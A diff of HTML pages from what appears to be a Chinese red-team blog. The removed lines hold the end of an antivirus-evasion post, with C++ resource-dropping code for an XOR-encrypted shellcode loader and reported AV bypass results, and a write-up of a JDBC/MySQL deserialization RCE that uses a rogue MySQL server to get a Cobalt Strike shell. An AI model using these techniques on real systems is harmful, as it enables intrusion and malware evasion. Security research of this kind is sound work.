-<p>释放资源代码参考：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Release_resources</span><span class="params">(CHAR* szResourceType, CHAR* szFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 找到资源</span></span><br><span class="line">	HRSRC hRsrc = <span class="built_in">FindResource</span>(<span class="literal">NULL</span>, <span class="built_in">MAKEINTRESOURCE</span>(IDR_TESTRES1), szResourceType);</span><br><span class="line">	<span class="comment">// 获取资源大小</span></span><br><span class="line">	DWORD dwSize = <span class="built_in">SizeofResource</span>(<span class="literal">NULL</span>, hRsrc);</span><br><span class="line">	<span class="comment">// 载入资源</span></span><br><span class="line">	HGLOBAL hGlobal = <span class="built_in">LoadResource</span>(<span class="literal">NULL</span>, hRsrc);</span><br><span class="line">	<span class="comment">// 锁定资源，并返回指向资源第一字节的指针--</span></span><br><span class="line">	LPVOID lpRes = <span class="built_in">LockResource</span>(hGlobal);</span><br><span class="line">	HANDLE hFile = <span class="built_in">CreateFile</span>(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	DWORD dwWriten = <span class="number">0</span>;</span><br><span class="line">	BOOL bRes = <span class="built_in">WriteFile</span>(hFile, lpRes, dwSize, &amp;dwWriten, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hGlobal);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hRsrc);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我的代码写的是会在同一目录下释放一个txt文件。</p>
-<p><img src="/attach/image/image-20210803134548753.png" alt="/attach/image/image-20210803134548753"></p>
-<p>这里我也成功上线了，测试免杀效果，最新的windows-defender</p>
-<p><img src="/attach/image/image-20210803135321611.png" alt="/attach/image/image-20210803135321611"></p>
-<p>火绒加360全家桶</p>
-<p><img src="/attach/image/image-20210803140124552.png" alt="/attach/image/image-20210803140124552"></p>
-<p>膨胀了，膨胀了，我要测试卡巴，资金有限只能测试免费版。</p>
-<p><img src="/attach/image/image-20210803141425235.png" alt="/attach/image/image-20210803141425235"></p>
-<p>效果还不错！</p>
-<h2 id="3-思考与改进之处"><a href="#3-思考与改进之处" class="headerlink" title="3.思考与改进之处"></a>3.思考与改进之处</h2><p>1.pe加载器固然好，上线没问题，但是不保证你执行命令不被标记为木马，因为像卡巴这种主要是启发式扫描强，你不去执行任何操作，过静态很好过的，但是你去执行操作就有另一个故事了。</p>
-<p>2.这次我用的是疑惑加密，其实最好的还是用AES这些商用的加密算法比较好。</p>
-<p>3.把异或好的shellcode放入资源，然后再释放，可能还是会存在一些行为，毕竟这是木马常用的手段。</p>
-<p>4.pe加载器还可以不断提取，优化，做到定制化的生成木马工具。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blog.rizhan.icu/2021/08/06/%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AA%81%E7%A0%B4%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="QAX Z-Team">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="奇安信Z-Team技术博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/08/06/%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AA%81%E7%A0%B4%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB/" class="post-title-link" itemprop="url">利用代码审计突破网络隔离</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-08-06 19:05:51 / Modified: 19:35:01" itemprop="dateCreated datePublished" datetime="2021-08-06T19:05:51+08:00">2021-08-06</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE/" itemprop="url" rel="index"><span itemprop="name">实战项目</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>​        一次红队项目中，通过反序列化拿下入口点webshell，经过信息收集发现该机器在dmz区域，且c段内只有一台机器，猜测应该是防火墙做了连接限制，如果突破不了dmz区域，这个点就毫无作用。后续对webshell进行本机信息收集，发现了一个感兴趣的进程”b*agent.exe”,通过检索该进程配置文件定位到该agent服务端，经过测试连接，竟然能直接跨网段访问到it运维人员用于监控网络资产的设备主页，从设备的用途上可以分析出大概率这台设备的ACL很好，经过坚持不懈的努力成功登陆（不要问，问就是弱口令），通过监控面板看到了很多其他网段的关键主机和设备，如果能打下来这个监控设备的点，就能突破网络隔离，去探索新世界了！</p>
-<p>​        黑盒测过没发现能直接打死的漏洞，只能走上找寻源码的不归路。通过fofa、google搜了下，公网用的还不少，但打旁站或者供应商成本过于大，结合在供应商主页找到了设备的系统名称，拿着关键字最后在某盘找到了几套与目标版本比较近的安装包 ：）</p>
-<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>​        安装完之后，导出代码到IDEA，SpringMVC的，正常走一遍代码审计流程，web.xml下没有能直接RCE的，查看第三方jar包也没有能利用的，那就看看路由吧！</p>
-<h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>path参数可控，response直接返回了FileInputStream</p>
-<p><img src="/attach/image/image-20210805131225117.png" alt="image-20210805131225117"></p>
-<p><img src="/attach/image/image-20210805132220649.png" alt="image-20210805132220649"></p>
-<p>入口点如下：</p>
-<p><img src="/attach/image/image-20210804120050819.png" alt="image-20210804120050819"></p>
-<p>​        路由 “/testDataBaseConn” 传入传参DataBaseConfigPojo类调用testDataBaseConn方法，DataBaseConfigPojo类中定义了getter/setter方法，用来获取ip、端口、配置项等。</p>
-<p><img src="/attach/image/image-20210804121402518.png" alt="image-20210804121402518"></p>
-<p>testDataBaseConn 方法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//DataBaseConfigPojo实体类，获得整个url以及ip、端口的getter/setter等</span><br><span class="line">private void testDataBaseConn(DataBaseConfigPojo dbConfPojo) throws Exception &#123;</span><br><span class="line">    //初始化数据库连接</span><br><span class="line">    Connection t_conn = null;</span><br><span class="line">    Statement t_stmt = null;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        //t_url是数据库连接的格式，替换ip、端口、名称到t_url</span><br><span class="line">        //这里的t_url我们就可以控制他的连接ip、端口、配置项了</span><br><span class="line">        String t_url = dbConfPojo.getUrlTemplate().replace(&quot;&#123;0&#125;&quot;, dbConfPojo.getIp()).replace(&quot;&#123;1&#125;&quot;, dbConfPojo.getPort()).replace(&quot;&#123;2&#125;&quot;, dbConfPojo.getName());</span><br><span class="line">        Class.forName(dbConfPojo.getDriver());</span><br><span class="line">        S_LOGGER.info(&quot;Successfully download JDBC!&quot;);</span><br><span class="line">        //使用t_url的内容连接数据库，触发漏洞</span><br><span class="line">        t_conn = DriverManager.getConnection(t_url, dbConfPojo.getUser(), dbConfPojo.getPassword());</span><br><span class="line">        S_LOGGER.info(&quot;Successfully connect to DB!&quot;);</span><br><span class="line">        t_stmt = t_conn.createStatement();</span><br><span class="line">        t_stmt.executeQuery(&quot;Select count(*) from &quot; + dbConfPojo.getTableName());</span><br><span class="line">    &#125; catch (SQLException var8) &#123;</span><br><span class="line">        S_LOGGER.error(&quot;testDataBaseConn&quot;, var8);</span><br><span class="line">        throw var8;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        t_stmt.close();</span><br><span class="line">        t_conn.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到ip、host、配置项我们都可以控制，只要目标能够连接到恶意Mysql服务器就可以实现反序列化。</p>
-<h3 id="JDBC简介"><a href="#JDBC简介" class="headerlink" title="JDBC简介"></a>JDBC简介</h3><p>JDBC（Java DataBase Connectivity）即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。</p>
-<p>一般格式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc://driver://host:port/database?配置name1=配置Value1&amp;配置name2=配置Value2</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>如果攻击者能够控制JDBC连接设置项，那么就可以通过设置其指向恶意MySQL服务器进行ObjectInputStream.readObject()的反序列化攻击从而RCE。</p>
-<p>具体点说，就是通过JDBC连接MySQL服务端时，会有几个内置的SQL查询语句要执行，其中两个查询的结果集在MySQL客户端被处理时会调用ObjectInputStream.readObject()进行反序列化操作。如果攻击者搭建恶意MySQL服务器来控制这两个查询的结果集，并且攻击者可以控制JDBC连接设置项，那么就能触发MySQL JDBC客户端反序列化漏洞。</p>
-<p>可被利用的两条查询语句：</p>
-<ul>
-<li>SHOW SESSION STATUS</li>
-<li>SHOW COLLATION</li>
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>北京基地
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://blog.rizhan.icu/2021/08/06/Exchange%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/" title="Exchange渗透总结">https://blog.rizhan.icu/2021/08/06/Exchange渗透总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
 </ul>
-<p>说通俗点，就是在目标可以连接到恶意MySQL服务器的前提下，host、post、配置项可控，就可以触发Mysql反序列化。</p>
-<h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>mysql-connector-java &lt; 5.1.49</p>
-<p>mysql-connector-java-6.x</p>
-<p>mysql-connector-java &lt; 8.0.20</p>
-<h3 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h3><p>​        恶意Mysql服务器搭建：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></li>
-</ul>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>构造恶意Mysql服务器，以fnmsd的工具为例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com.cnpmjs.org/fnmsd/MySQL_Fake_Server.git</span><br></pre></td></tr></table></figure>
+</div>
 
-<p>修改 config.json</p>
-<p><img src="/attach/image/image-20210804134351391.png" alt="image-20210804134351391"></p>
-<p>启动服务</p>
-<p><img src="/attach/image/image-20210804134439332.png" alt="image-20210804134439332"></p>
-<p>发包，MySQL_Fake_Server通过user来选择payload，这里使用URLDNS来确定是否存在漏洞</p>
-<p><img src="/attach/image/image-20210804141942664.png" alt="image-20210804141942664"></p>
-<p>Dnslog有回显，现在就找个反序列化链直接打就可以了</p>
-<p><img src="/attach/image/image-20210804142021591.png" alt="image-20210804142021591"></p>
-<p>查看lib包，有一条CC10的链<img src="/attach/image/image-20210804173310667.png" alt="image-20210804173310667"></p>
-<p>重新配置config.json 。</p>
-<p><img src="/attach/image/image-20210804175451690.png" alt="image-20210804175451690"></p>
-<p>user参数修改成config.json中自定义的参数，目标出网，可利用CC10执行系统命令，直接上线cs一发入魂</p>
-<p><img src="/attach/image/image-20210805143151394.png" alt="image-20210804175624951"></p>
-<p>接着就可以去探索新世界了！</p>
-<p><img src="/attach/image/image-20210804175841322.png" alt="image-20210804175841322"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
-<li><p> 登陆设备</p>
-</li>
-<li><p> 找到源码</p>
-</li>
-<li><p> 代码审计发现Mysql反序列化</p>
-</li>
-<li><p> 漏洞利用</p>
-</li>
-</ol>
 
-      
-    </div>
-
-    
-    
-    
       <footer class="post-footer">
-        <div class="post-eof"></div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/08/06/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDCS-Stageless%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/" rel="prev" title="内存加载CS-Stageless进行免杀">
+      <i class="fa fa-chevron-left"></i> 内存加载CS-Stageless进行免杀
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
@@ -690,6 +482,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">1.</span> <span class="nav-text">测试环境准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0Exchange"><span class="nav-number">2.</span> <span class="nav-text">发现Exchange</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">利用端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%90%8E%E7%BC%80"><span class="nav-number">2.2.</span> <span class="nav-text">特殊后缀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%9F%9F%E5%90%8D"><span class="nav-number">2.3.</span> <span class="nav-text">特殊域名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8BExchange%E7%89%88%E6%9C%AC"><span class="nav-number">2.4.</span> <span class="nav-text">查看Exchange版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exchange%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="nav-number">3.</span> <span class="nav-text">Exchange账号密码爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF"><span class="nav-number">3.1.</span> <span class="nav-text">收集邮箱信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8AutoDiscover%E6%8E%A5%E5%8F%A3%E8%BF%9B%E8%A1%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="nav-number">3.2.</span> <span class="nav-text">利用AutoDiscover接口进行密码爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8owa%E6%8E%A5%E5%8F%A3%E8%BF%9B%E8%A1%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="nav-number">3.3.</span> <span class="nav-text">利用owa接口进行密码爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8ews%E6%8E%A5%E5%8F%A3%E8%BF%9B%E8%A1%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="nav-number">3.4.</span> <span class="nav-text">利用ews接口进行密码爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Microsoft-Server-ActiveSync%E6%8E%A5%E5%8F%A3%E8%BF%9B%E8%A1%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="nav-number">3.5.</span> <span class="nav-text">利用Microsoft-Server-ActiveSync接口进行密码爆破</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exchange-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">Exchange 历史漏洞总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-28482"><span class="nav-number">4.1.</span> <span class="nav-text">CVE-2021-28482</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2021-26855"><span class="nav-number">4.2.</span> <span class="nav-text">CVE-2021-26855</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-17144"><span class="nav-number">4.3.</span> <span class="nav-text">CVE-2020-17144</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-16875"><span class="nav-number">4.4.</span> <span class="nav-text">CVE-2020-16875</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-0688"><span class="nav-number">4.5.</span> <span class="nav-text">CVE-2020-0688</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exchange%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">Exchange内网利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2018-8581"><span class="nav-number">5.1.</span> <span class="nav-text">CVE-2018-8581</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2019-1040"><span class="nav-number">5.2.</span> <span class="nav-text">CVE-2019-1040</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">5.2.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">5.2.2.</span> <span class="nav-text">方法二</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
